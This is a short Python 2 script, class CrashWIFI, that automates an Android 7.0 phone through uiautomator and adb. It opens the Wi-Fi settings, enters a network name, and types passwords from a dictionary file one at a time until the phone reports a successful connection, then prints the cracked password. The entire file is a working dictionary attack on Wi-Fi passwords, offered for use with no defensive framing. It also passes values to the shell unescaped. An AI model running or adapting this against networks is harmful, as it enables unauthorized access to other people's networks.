# -*-coding=utf-8-*-
__author__ = 'Rocky'
#目前只适用于android 7.0 系统
from uiautomator import device as d
import subprocess,time
class CrashWIFI():

    def crash_wifi_android_n(self,ap,dict_file):
        f=open(dict_file,'r')
        count=0
        while 1:
            pwd=f.readline().strip()
            if not pwd:
                print "END of Password, no password found in the dictionary"
                break
            result=self.crash(count,ap,pwd)
            if result:
                break
            count=count+1

    def crash(self,count,ap,passwd):
        print "WIFI connect in LOOP %d" % count
        # get_log(count)
        d.press.home()
        d.press.down()
        d.press.down()
        d.press.down()

        d.press.right()
        d.press.right()
        #d.press.right()
        # d.press.right()

        d.press.enter()
        time.sleep(3)
        d.press.enter()
        time.sleep(3)
        d.press.down()
        d.press.down()
        d.press.down()
        d.press.down()
        d.press.down()

        d.press.enter()
        time.sleep(2)
        cmd = 'adb shell input text %s' % ap
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        cmd = 'adb shell input keyevent KEYCODE_ESCAPE'
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        time.sleep(1)
        d.press.enter()
        time.sleep(1)

        # d.press.enter()


        d.press.down()
        d.press.down()
        d.press.enter()
        cmd = 'adb shell input text %s' % passwd
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        cmd = 'adb shell input keyevent KEYCODE_ESCAPE'
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        time.sleep(1)
        d.press.enter()
        def_timeout=15
        if d(text="Connected successfully").wait.exists(timeout=def_timeout * 1000) == True:
            print "connected successfully"
            print "password is ", passwd
            return 1
        else:
            return 0

if __name__=='__main__':
    obj=CrashWIFI()
    obj.crash_wifi_android_n('xiaomi2g','password.txt')
